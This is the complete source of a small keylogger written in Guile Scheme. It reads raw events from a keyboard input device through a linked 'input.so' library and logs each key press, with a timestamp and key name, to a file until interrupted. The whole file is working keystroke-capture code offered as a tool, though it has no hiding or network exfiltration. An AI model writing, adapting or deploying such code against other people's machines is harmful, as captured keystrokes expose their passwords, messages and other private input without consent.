;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Simple Keylogger                 ;;
;;                                  ;;
;; Author: Victor Santos            ;;
;; Email: vct.santos@protonmail.com ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
(use-modules (ice-9 getopt-long)
             (ice-9 format)
             (srfi srfi-9)
             (system foreign)
             (ice-9 binary-ports)
             (rnrs bytevectors)
             (system foreign-object)
             (ev-codes))

;; Create handler for libinput
(define libinput (dynamic-link "input.so"))

(define* (get bv #:optional (type 'code))
  (let* ((fn (format #f "get_~a" type))
	 (method (pointer->procedure
		  int
		  (dynamic-func fn libinput)
		  '(*))))
    (method (bytevector->pointer bv))))

(define (keylog device-name output-file-name)
  (let* ((log (open-output-file output-file-name))
	     (kbd (open-input-file device-name #:binary #t)))    
    (format #t "# [INFO] Reading from device ~a\n" device-name)
    (format log "# time; event; code; key\n")
    (let* ((nbytes 24)
	       (bv (make-bytevector nbytes))
	       (code 0)
	       (quit #f))      
      (while (not quit)
	    (get-bytevector-n! kbd bv 0 nbytes)
	    (set! code (get bv))	   
	    (when (= 1 (get bv 'value)) ;; key press
	      (format log "~a;press;~a;~a\n"
		          (strftime "%c" (localtime (current-time)))
		          code
		          (cdr (assq code event-codes))))
	    ;; Catch Ctrl+C
	    (sigaction SIGINT
	      (lambda (x)
	        (format log "\n# [INFO] Pressed Ctrl+C. Finishing keylogger...\n")
	        (set! quit #t))))
      (close kbd)
      (close log))))

;;;;;;;;;;;;;;;;;;;
;; Main function ;;
;;;;;;;;;;;;;;;;;;;
(define (display-help)
  (display "\
keylogger [options] --input <device>
  -h, --help       Display this help
  -i, --input      Input Device
"))

(define (main args)
  (if (< (length args) 2)
      (display-help)
      (let* ((option-spec '((help  (single-char #\h) (value #f))
                            (input (single-char #\i) (value #t))
                            (output (single-char #\o) (value #t))))
             (options (getopt-long args option-spec))
             (help-wanted? (option-ref options 'help #f)))
        (if help-wanted?
            (display-help)        
            (keylog (option-ref options 'input #f) (option-ref options 'output #f))))))





